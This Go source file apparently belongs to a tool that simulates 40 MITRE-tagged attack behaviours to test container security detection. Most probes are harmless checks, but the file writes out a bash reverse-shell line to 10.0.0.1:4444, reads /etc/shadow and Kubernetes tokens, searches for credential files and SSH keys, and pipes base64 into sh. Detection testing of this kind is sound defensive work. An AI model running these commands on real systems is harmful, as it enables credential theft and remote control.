package events

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

var Catalog = []SecurityEvent{
	{
		ID:          "QCR001",
		Name:        "Container Namespace Probe",
		Description: "Attempt to read host namespace information",
		Category:    string(ContainerEscape),
		MITRE:       []string{"T1611"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execNamespaceProbe,
	},
	{
		ID:          "QCR002",
		Name:        "Cgroup Path Enumeration",
		Description: "Read cgroup release_agent paths",
		Category:    string(ContainerEscape),
		MITRE:       []string{"T1611"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execCgroupEnum,
	},
	{
		ID:          "QCR003",
		Name:        "SUID Binary Search",
		Description: "Search for setuid binaries",
		Category:    string(PrivilegeEscalation),
		MITRE:       []string{"T1548.001"},
		Severity:    "MEDIUM",
		Privileged:  false,
		Executor:    execSuidSearch,
	},
	{
		ID:          "QCR004",
		Name:        "Setuid Permission Change",
		Description: "Attempt to set SUID bit on file",
		Category:    string(PrivilegeEscalation),
		MITRE:       []string{"T1548.001"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execSetuidChange,
	},
	{
		ID:          "QCR005",
		Name:        "Capability Check",
		Description: "Enumerate process capabilities",
		Category:    string(PrivilegeEscalation),
		MITRE:       []string{"T1548.001"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execCapabilityCheck,
	},
	{
		ID:          "QCR006",
		Name:        "AWS Metadata Service Access",
		Description: "Contact AWS EC2 IMDS endpoint",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.005"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execAWSMetadata,
	},
	{
		ID:          "QCR007",
		Name:        "GCP Metadata Service Access",
		Description: "Contact GCP metadata endpoint",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.005"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execGCPMetadata,
	},
	{
		ID:          "QCR008",
		Name:        "Azure IMDS Access",
		Description: "Contact Azure metadata endpoint",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.005"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execAzureMetadata,
	},
	{
		ID:          "QCR009",
		Name:        "Shadow File Read",
		Description: "Attempt to read /etc/shadow",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.001"},
		Severity:    "HIGH",
		Privileged:  true,
		Executor:    execShadowRead,
	},
	{
		ID:          "QCR010",
		Name:        "Azure Credential File Search",
		Description: "Search for Azure credential files",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.001"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execAzureCredSearch,
	},
	{
		ID:          "QCR011",
		Name:        "AWS Credential File Search",
		Description: "Search for AWS credential files",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.001"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execAWSCredSearch,
	},
	{
		ID:          "QCR012",
		Name:        "K8s Service Account Token Read",
		Description: "Read Kubernetes service account token",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.007"},
		Severity:    "MEDIUM",
		Privileged:  false,
		Executor:    execK8sTokenRead,
	},
	{
		ID:          "QCR013",
		Name:        "Private Key Search",
		Description: "Search for SSH private keys",
		Category:    string(CredentialAccess),
		MITRE:       []string{"T1552.004"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execPrivateKeySearch,
	},
	{
		ID:          "QCR014",
		Name:        "Mining Pool Connection",
		Description: "Connect to cryptocurrency mining pool port",
		Category:    string(CryptoMining),
		MITRE:       []string{"T1496"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execMiningPoolConnect,
	},
	{
		ID:          "QCR015",
		Name:        "Crypto Miner Binary Simulation",
		Description: "Create and execute miner-like binary name",
		Category:    string(CryptoMining),
		MITRE:       []string{"T1496"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execCryptoMinerSim,
	},
	{
		ID:          "QCR016",
		Name:        "Network Port Scan",
		Description: "Execute network scanning activity",
		Category:    string(NetworkScanning),
		MITRE:       []string{"T1046"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execPortScan,
	},
	{
		ID:          "QCR017",
		Name:        "Raw Socket Creation",
		Description: "Create raw network socket",
		Category:    string(NetworkScanning),
		MITRE:       []string{"T1046"},
		Severity:    "MEDIUM",
		Privileged:  true,
		Executor:    execRawSocket,
	},
	{
		ID:          "QCR018",
		Name:        "Reverse Shell - Bash",
		Description: "Simulate bash reverse shell pattern",
		Category:    string(C2Communication),
		MITRE:       []string{"T1059.004"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execBashReverseShell,
	},
	{
		ID:          "QCR019",
		Name:        "Reverse Shell - Python",
		Description: "Simulate Python reverse shell pattern",
		Category:    string(C2Communication),
		MITRE:       []string{"T1059.006"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execPythonReverseShell,
	},
	{
		ID:          "QCR020",
		Name:        "Netcat Listener",
		Description: "Start netcat in listen mode",
		Category:    string(C2Communication),
		MITRE:       []string{"T1059"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execNetcatListener,
	},
	{
		ID:          "QCR021",
		Name:        "Tunnel Tool Execution",
		Description: "Simulate tunnel tool usage",
		Category:    string(C2Communication),
		MITRE:       []string{"T1572"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execTunnelTool,
	},
	{
		ID:          "QCR022",
		Name:        "Suspicious Port Connection",
		Description: "Connect to known C2 ports",
		Category:    string(C2Communication),
		MITRE:       []string{"T1071"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execSuspiciousPort,
	},
	{
		ID:          "QCR023",
		Name:        "Security Process Kill Attempt",
		Description: "Attempt to terminate security processes",
		Category:    string(DefenseEvasion),
		MITRE:       []string{"T1562.001"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execSecurityKill,
	},
	{
		ID:          "QCR024",
		Name:        "Security Config Tampering",
		Description: "Attempt to modify security tool configs",
		Category:    string(DefenseEvasion),
		MITRE:       []string{"T1562.001"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execSecurityConfigTamper,
	},
	{
		ID:          "QCR025",
		Name:        "Log File Deletion",
		Description: "Attempt to delete log files",
		Category:    string(DefenseEvasion),
		MITRE:       []string{"T1070.002"},
		Severity:    "HIGH",
		Privileged:  true,
		Executor:    execLogDeletion,
	},
	{
		ID:          "QCR026",
		Name:        "SELinux/AppArmor Check",
		Description: "Check and attempt to disable MAC",
		Category:    string(DefenseEvasion),
		MITRE:       []string{"T1562.001"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execMACDisable,
	},
	{
		ID:          "QCR027",
		Name:        "Cron Job Creation",
		Description: "Create scheduled task via cron",
		Category:    string(Persistence),
		MITRE:       []string{"T1053.003"},
		Severity:    "HIGH",
		Privileged:  true,
		Executor:    execCronPersistence,
	},
	{
		ID:          "QCR028",
		Name:        "Systemd Service Creation",
		Description: "Create systemd service file",
		Category:    string(Persistence),
		MITRE:       []string{"T1543.002"},
		Severity:    "HIGH",
		Privileged:  true,
		Executor:    execSystemdPersistence,
	},
	{
		ID:          "QCR029",
		Name:        "SSH Key Injection",
		Description: "Modify SSH authorized_keys",
		Category:    string(Persistence),
		MITRE:       []string{"T1098.004"},
		Severity:    "HIGH",
		Privileged:  true,
		Executor:    execSSHKeyInjection,
	},
	{
		ID:          "QCR030",
		Name:        "LD Preload Modification",
		Description: "Modify ld.so.preload",
		Category:    string(Persistence),
		MITRE:       []string{"T1574.006"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execLDPreload,
	},
	{
		ID:          "QCR031",
		Name:        "Kernel Module Probe",
		Description: "Attempt to load kernel module",
		Category:    string(Persistence),
		MITRE:       []string{"T1547.006"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execKernelModule,
	},
	{
		ID:          "QCR032",
		Name:        "Base64 Shell Command",
		Description: "Execute base64-encoded shell command",
		Category:    string(Execution),
		MITRE:       []string{"T1059.004", "T1027"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execBase64Shell,
	},
	{
		ID:          "QCR033",
		Name:        "Base64 Python Command",
		Description: "Execute base64-encoded Python",
		Category:    string(Execution),
		MITRE:       []string{"T1059.006", "T1027"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execBase64Python,
	},
	{
		ID:          "QCR034",
		Name:        "Compiler Execution",
		Description: "Execute build tools in container",
		Category:    string(Execution),
		MITRE:       []string{"T1027.004"},
		Severity:    "MEDIUM",
		Privileged:  false,
		Executor:    execCompiler,
	},
	{
		ID:          "QCR035",
		Name:        "Web Shell Simulation",
		Description: "Simulate webshell-like behavior",
		Category:    string(Execution),
		MITRE:       []string{"T1505.003"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execWebShell,
	},
	{
		ID:          "QCR036",
		Name:        "Kubernetes API Access",
		Description: "Contact Kubernetes API server",
		Category:    string(Discovery),
		MITRE:       []string{"T1613"},
		Severity:    "MEDIUM",
		Privileged:  false,
		Executor:    execK8sAPIAccess,
	},
	{
		ID:          "QCR037",
		Name:        "SSH Lateral Movement",
		Description: "Attempt SSH connection",
		Category:    string(LateralMovement),
		MITRE:       []string{"T1021.004"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execSSHLateral,
	},
	{
		ID:          "QCR038",
		Name:        "Bulk File Deletion",
		Description: "Mass file deletion attempt",
		Category:    string(Impact),
		MITRE:       []string{"T1485"},
		Severity:    "CRITICAL",
		Privileged:  false,
		Executor:    execBulkDelete,
	},
	{
		ID:          "QCR039",
		Name:        "Process Memory Dump",
		Description: "Attempt to read process memory",
		Category:    string(Collection),
		MITRE:       []string{"T1003"},
		Severity:    "CRITICAL",
		Privileged:  true,
		Executor:    execMemoryDump,
	},
	{
		ID:          "QCR040",
		Name:        "Environment Variable Dump",
		Description: "Read process environment secrets",
		Category:    string(Collection),
		MITRE:       []string{"T1552.007"},
		Severity:    "HIGH",
		Privileged:  false,
		Executor:    execEnvDump,
	},
}

func execNamespaceProbe() error {
	paths := []string{"/proc/1/ns/mnt", "/proc/1/ns/pid", "/proc/1/ns/net"}
	for _, p := range paths {
		if _, err := os.Readlink(p); err == nil {
			fmt.Printf("  Read namespace: %s\n", p)
		}
	}
	return nil
}

func execCgroupEnum() error {
	paths := []string{
		"/sys/fs/cgroup/memory/release_agent",
		"/sys/fs/cgroup/release_agent",
		"/sys/fs/cgroup/cpu/release_agent",
	}
	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil {
			fmt.Printf("  Read cgroup: %s = %s\n", p, string(data))
		}
	}
	return nil
}

func execSuidSearch() error {
	cmd := exec.Command("find", "/usr", "-perm", "-4000", "-type", "f", "-maxdepth", "3")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func execSetuidChange() error {
	tmpFile := "/tmp/qcr-suid-test"
	if err := os.WriteFile(tmpFile, []byte("#!/bin/sh\necho test"), 0755); err != nil {
		return err
	}
	defer os.Remove(tmpFile)
	fmt.Printf("  Attempting chmod u+s on %s\n", tmpFile)
	return os.Chmod(tmpFile, 0755|os.ModeSetuid)
}

func execCapabilityCheck() error {
	cmd := exec.Command("cat", "/proc/self/status")
	output, _ := cmd.Output()
	fmt.Printf("  Process capabilities from /proc/self/status\n")
	for _, line := range splitLines(string(output)) {
		if contains(line, "Cap") {
			fmt.Printf("  %s\n", line)
		}
	}
	return nil
}

func execAWSMetadata() error {
	fmt.Println("  Connecting to AWS IMDS 169.254.169.254:80...")
	conn, err := net.DialTimeout("tcp", "169.254.169.254:80", 2*time.Second)
	if err != nil {
		fmt.Printf("  Connection failed (expected in non-AWS): %v\n", err)
		return nil
	}
	conn.Close()
	fmt.Println("  Connection successful")
	return nil
}

func execGCPMetadata() error {
	fmt.Println("  Connecting to GCP metadata 169.254.169.254:80...")
	conn, err := net.DialTimeout("tcp", "169.254.169.254:80", 2*time.Second)
	if err != nil {
		fmt.Printf("  Connection failed (expected in non-GCP): %v\n", err)
		return nil
	}
	conn.Close()
	return nil
}

func execAzureMetadata() error {
	fmt.Println("  Connecting to Azure IMDS 169.254.169.254:80...")
	conn, err := net.DialTimeout("tcp", "169.254.169.254:80", 2*time.Second)
	if err != nil {
		fmt.Printf("  Connection failed (expected in non-Azure): %v\n", err)
		return nil
	}
	conn.Close()
	return nil
}

func execShadowRead() error {
	fmt.Println("  Attempting to read /etc/shadow...")
	data, err := os.ReadFile("/etc/shadow")
	if err != nil {
		fmt.Printf("  Read failed (expected): %v\n", err)
		return nil
	}
	fmt.Printf("  Read %d bytes from /etc/shadow\n", len(data))
	return nil
}

func execAzureCredSearch() error {
	paths := []string{
		filepath.Join(os.Getenv("HOME"), ".azure", "accessTokens.json"),
		filepath.Join(os.Getenv("HOME"), ".azure", "azureProfile.json"),
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			fmt.Printf("  Found: %s\n", p)
		} else {
			fmt.Printf("  Not found: %s\n", p)
		}
	}
	return nil
}

func execAWSCredSearch() error {
	paths := []string{
		filepath.Join(os.Getenv("HOME"), ".aws", "credentials"),
		filepath.Join(os.Getenv("HOME"), ".aws", "config"),
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			fmt.Printf("  Found: %s\n", p)
		} else {
			fmt.Printf("  Not found: %s\n", p)
		}
	}
	return nil
}

func execK8sTokenRead() error {
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	fmt.Printf("  Reading K8s token: %s\n", tokenPath)
	if data, err := os.ReadFile(tokenPath); err == nil {
		fmt.Printf("  Token length: %d bytes\n", len(data))
	} else {
		fmt.Printf("  Not found (expected outside K8s): %v\n", err)
	}
	return nil
}

func execPrivateKeySearch() error {
	cmd := exec.Command("find", os.Getenv("HOME"), "-name", "id_rsa", "-o", "-name", "*.pem", "-maxdepth", "4")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func execMiningPoolConnect() error {
	ports := []string{"3333", "4444", "14433"}
	for _, port := range ports {
		fmt.Printf("  Attempting connection to mining port %s...\n", port)
		conn, err := net.DialTimeout("tcp", "127.0.0.1:"+port, 1*time.Second)
		if err == nil {
			conn.Close()
			fmt.Printf("  Port %s open\n", port)
		}
	}
	return nil
}

func execCryptoMinerSim() error {
	tmpFile := "/tmp/xmrig-test"
	fmt.Printf("  Creating fake miner binary: %s\n", tmpFile)
	if err := os.WriteFile(tmpFile, []byte("#!/bin/sh\necho 'mining simulation'"), 0755); err != nil {
		return err
	}
	defer os.Remove(tmpFile)
	cmd := exec.Command(tmpFile)
	return cmd.Run()
}

func execPortScan() error {
	fmt.Println("  Scanning local ports 22, 80, 443, 8080...")
	ports := []int{22, 80, 443, 8080}
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 500*time.Millisecond)
		if err == nil {
			conn.Close()
			fmt.Printf("  Port %d: OPEN\n", port)
		} else {
			fmt.Printf("  Port %d: closed\n", port)
		}
	}
	return nil
}

func execRawSocket() error {
	fmt.Println("  Attempting to create raw socket...")
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		fmt.Printf("  Failed (expected without CAP_NET_RAW): %v\n", err)
		return nil
	}
	syscall.Close(fd)
	fmt.Println("  Raw socket created successfully")
	return nil
}

func execBashReverseShell() error {
	fmt.Println("  Simulating bash reverse shell pattern...")
	cmd := exec.Command("bash", "-c", "echo 'Would execute: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
	cmd.Stdout = os.Stdout
	return cmd.Run()
}

func execPythonReverseShell() error {
	fmt.Println("  Simulating Python reverse shell pattern...")
	script := `import socket; print('Would create reverse shell socket')`
	cmd := exec.Command("python3", "-c", script)
	if err := cmd.Run(); err != nil {
		cmd = exec.Command("python", "-c", script)
		return cmd.Run()
	}
	return nil
}

func execNetcatListener() error {
	fmt.Println("  Checking for netcat...")
	for _, nc := range []string{"nc", "ncat", "netcat"} {
		if path, err := exec.LookPath(nc); err == nil {
			fmt.Printf("  Found: %s\n", path)
			return nil
		}
	}
	fmt.Println("  Netcat not found")
	return nil
}

func execTunnelTool() error {
	tools := []string{"socat", "chisel", "ngrok", "stunnel"}
	for _, tool := range tools {
		if path, err := exec.LookPath(tool); err == nil {
			fmt.Printf("  Found tunnel tool: %s\n", path)
		}
	}
	return nil
}

func execSuspiciousPort() error {
	ports := []int{4444, 5555, 6666, 1337}
	for _, port := range ports {
		fmt.Printf("  Attempting connection to suspicious port %d...\n", port)
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 500*time.Millisecond)
		if err == nil {
			conn.Close()
		}
	}
	return nil
}

func execSecurityKill() error {
	procs := []string{"falco", "tetragon", "qualys-cloud-agent", "osqueryd"}
	fmt.Println("  Looking for security processes...")
	cmd := exec.Command("pgrep", "-l", "-f", "falco|tetragon|qualys|osquery")
	cmd.Stdout = os.Stdout
	cmd.Run()
	fmt.Printf("  Would attempt to kill: %v\n", procs)
	return nil
}

func execSecurityConfigTamper() error {
	paths := []string{"/etc/falco/falco.yaml", "/etc/tetragon/tetragon.yaml"}
	for _, p := range paths {
		fmt.Printf("  Checking config: %s\n", p)
		if _, err := os.Stat(p); err == nil {
			fmt.Printf("  Found: %s\n", p)
		}
	}
	return nil
}

func execLogDeletion() error {
	fmt.Println("  Simulating log deletion...")
	tmpLog := "/tmp/fake-auth.log"
	os.WriteFile(tmpLog, []byte("fake log content"), 0644)
	defer os.Remove(tmpLog)
	fmt.Printf("  Created and will delete: %s\n", tmpLog)
	return os.Remove(tmpLog)
}

func execMACDisable() error {
	fmt.Println("  Checking SELinux status...")
	cmd := exec.Command("getenforce")
	if output, err := cmd.Output(); err == nil {
		fmt.Printf("  SELinux: %s", output)
	}
	fmt.Println("  Checking AppArmor status...")
	if data, err := os.ReadFile("/sys/kernel/security/apparmor/profiles"); err == nil {
		fmt.Printf("  AppArmor profiles loaded: %d bytes\n", len(data))
	}
	return nil
}

func execCronPersistence() error {
	fmt.Println("  Simulating cron persistence...")
	tmpCron := "/tmp/fake-cron-job"
	content := "* * * * * echo 'persistence test'\n"
	if err := os.WriteFile(tmpCron, []byte(content), 0644); err != nil {
		return err
	}
	defer os.Remove(tmpCron)
	fmt.Printf("  Created: %s\n", tmpCron)
	return nil
}

func execSystemdPersistence() error {
	fmt.Println("  Simulating systemd persistence...")
	tmpService := "/tmp/fake-service.service"
	content := "[Unit]\nDescription=Test\n[Service]\nExecStart=/bin/true\n"
	if err := os.WriteFile(tmpService, []byte(content), 0644); err != nil {
		return err
	}
	defer os.Remove(tmpService)
	fmt.Printf("  Created: %s\n", tmpService)
	return nil
}

func execSSHKeyInjection() error {
	sshDir := filepath.Join(os.Getenv("HOME"), ".ssh")
	authKeys := filepath.Join(sshDir, "authorized_keys")
	fmt.Printf("  Checking: %s\n", authKeys)
	if _, err := os.Stat(authKeys); err == nil {
		fmt.Println("  authorized_keys exists")
	}
	return nil
}

func execLDPreload() error {
	fmt.Println("  Checking ld.so.preload...")
	if data, err := os.ReadFile("/etc/ld.so.preload"); err == nil {
		fmt.Printf("  Contents: %s\n", string(data))
	} else {
		fmt.Println("  File does not exist or not readable")
	}
	return nil
}

func execKernelModule() error {
	fmt.Println("  Listing loaded kernel modules...")
	cmd := exec.Command("lsmod")
	cmd.Stdout = os.Stdout
	return cmd.Run()
}

func execBase64Shell() error {
	fmt.Println("  Executing base64-encoded shell command...")
	encoded := "ZWNobyAnYmFzZTY0IHRlc3Qn"
	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo %s | base64 -d | sh", encoded))
	cmd.Stdout = os.Stdout
	return cmd.Run()
}

func execBase64Python() error {
	fmt.Println("  Executing base64-encoded Python...")
	script := `import base64; print(base64.b64decode('dGVzdA==').decode())`
	cmd := exec.Command("python3", "-c", script)
	cmd.Stdout = os.Stdout
	if err := cmd.Run(); err != nil {
		cmd = exec.Command("python", "-c", script)
		cmd.Stdout = os.Stdout
		return cmd.Run()
	}
	return nil
}

func execCompiler() error {
	compilers := []string{"gcc", "g++", "clang", "make", "go"}
	for _, c := range compilers {
		if path, err := exec.LookPath(c); err == nil {
			fmt.Printf("  Found compiler: %s\n", path)
		}
	}
	return nil
}

func execWebShell() error {
	fmt.Println("  Simulating webshell-like command execution...")
	cmds := []string{"id", "whoami", "uname -a"}
	for _, c := range cmds {
		cmd := exec.Command("sh", "-c", c)
		output, _ := cmd.Output()
		fmt.Printf("  %s: %s", c, output)
	}
	return nil
}

func execK8sAPIAccess() error {
	fmt.Println("  Attempting K8s API access...")
	endpoints := []string{"kubernetes.default.svc:443", "10.96.0.1:443"}
	for _, ep := range endpoints {
		conn, err := net.DialTimeout("tcp", ep, 2*time.Second)
		if err == nil {
			conn.Close()
			fmt.Printf("  Connected to: %s\n", ep)
		} else {
			fmt.Printf("  Cannot connect to %s (expected outside cluster)\n", ep)
		}
	}
	return nil
}

func execSSHLateral() error {
	fmt.Println("  Checking SSH client...")
	if path, err := exec.LookPath("ssh"); err == nil {
		fmt.Printf("  SSH found: %s\n", path)
	}
	fmt.Println("  Would attempt: ssh user@internal-host")
	return nil
}

func execBulkDelete() error {
	fmt.Println("  Simulating bulk file deletion...")
	tmpDir := "/tmp/qcr-bulk-test"
	os.MkdirAll(tmpDir, 0755)
	for i := 0; i < 5; i++ {
		os.WriteFile(filepath.Join(tmpDir, fmt.Sprintf("file%d.txt", i)), []byte("test"), 0644)
	}
	defer os.RemoveAll(tmpDir)
	fmt.Printf("  Created and removing: %s\n", tmpDir)
	return os.RemoveAll(tmpDir)
}

func execMemoryDump() error {
	fmt.Println("  Attempting to read /proc/self/maps...")
	data, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return err
	}
	lines := splitLines(string(data))
	fmt.Printf("  Memory regions: %d\n", len(lines))
	return nil
}

func execEnvDump() error {
	fmt.Println("  Reading process environment...")
	sensitiveVars := []string{"AWS_", "AZURE_", "GCP_", "API_KEY", "SECRET", "TOKEN", "PASSWORD"}
	for _, env := range os.Environ() {
		for _, s := range sensitiveVars {
			if contains(env, s) {
				parts := splitFirst(env, "=")
				fmt.Printf("  Found sensitive var: %s=***\n", parts)
				break
			}
		}
	}
	return nil
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		lines = append(lines, s[start:])
	}
	return lines
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func splitFirst(s, sep string) string {
	for i := 0; i <= len(s)-len(sep); i++ {
		if s[i:i+len(sep)] == sep {
			return s[:i]
		}
	}
	return s
}
